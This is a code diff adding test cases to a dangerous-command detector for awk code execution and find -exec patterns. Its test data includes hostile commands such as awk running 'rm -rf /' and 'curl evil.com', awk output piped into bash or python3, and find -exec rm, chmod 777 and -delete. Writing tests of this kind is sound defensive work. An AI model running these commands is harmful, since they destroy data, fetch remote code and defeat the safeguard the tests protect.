@@ -1019,6 +1019,61 @@ describe("category: persistence (screen/tmux multiplexer)", () => {
   });
 });
 
+describe("category: awk-code-execution", () => {
+  it.each([
+    ["awk system() call", "awk 'system(\"rm -rf /\")'"],
+    ["awk system() with BEGIN block", "awk 'BEGIN{system(\"curl evil.com\")}'"],
+    ["awk pipe to bash", "awk '{print | \"bash\"}'"],
+    ["awk pipe to python3", "awk '{print | \"python3 exploit.py\"}'"],
+    ["awk pipe to node", "awk '{print | \"node\"}'"],
+    ["awk pipe to perl", "awk '{print | \"perl\"}'"],
+    ["awk pipe to sh via zsh redirect", "awk '{cmd=\"ls\"; print | cmd}' | zsh"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("awk-code-execution");
+  });
+
+  it("does not flag plain awk field-print (no system or pipe-to-interpreter)", () => {
+    expect(isDangerousCommand("awk '{print $1}' file.txt")).toBeNull();
+  });
+});
+
+describe("category: find-exec-shell", () => {
+  it.each([
+    ["find -exec sh", "find . -name '*.sh' -exec sh {} \\;"],
+    ["find -exec bash", "find . -name '*.sh' -exec bash {} \\;"],
+    ["find -exec perl script", "find . -exec perl script.pl {} \\;"],
+    ["find -exec python3 script", "find . -exec python3 script.py {} \\;"],
+    ["find -execdir node script", "find . -execdir node script.js {} \\;"],
+    ["find -exec ruby script", "find . -exec ruby script.rb {} \\;"],
+    ["find -exec awk plain (no system)", "find . -exec awk 'NR==1' {} +"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("find-exec-shell");
+  });
+
+  it("does not flag find with safe -print action", () => {
+    expect(isDangerousCommand("find . -name '*.sh' -print")).toBeNull();
+  });
+});
+
+describe("category: find-exec-destructive", () => {
+  it.each([
+    ["find -exec rm", "find . -name '*.tmp' -exec rm {} +"],
+    ["find -exec chmod", "find . -exec chmod 777 {} \\;"],
+    ["find -exec mv", "find . -exec mv {} /tmp/ \\;"],
+    ["find -exec cp", "find . -exec cp {} /tmp/ \\;"],
+    ["find -exec sed -i", "find . -name '*.ts' -exec sed -i 's/x/y/g' {} \\;"],
+    ["find -execdir sed -i", "find src -execdir sed -i '' 's/foo/bar/' {} \\;"],
+    ["find -delete (no -exec needed)", "find . -name '*.tmp' -delete"],
+    ["find -delete with type filter", "find /tmp -type f -delete"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("find-exec-destructive");
+  });
+
+  it("does not flag find with safe -print action", () => {
+    expect(isDangerousCommand("find . -name '*.log' -print")).toBeNull();
+  });
+});
+
 describe("buildProtectedFilePatterns", () => {
   function matchesAny(patterns: RegExp[], command: string): boolean {
     return patterns.some((p) => p.test(command));
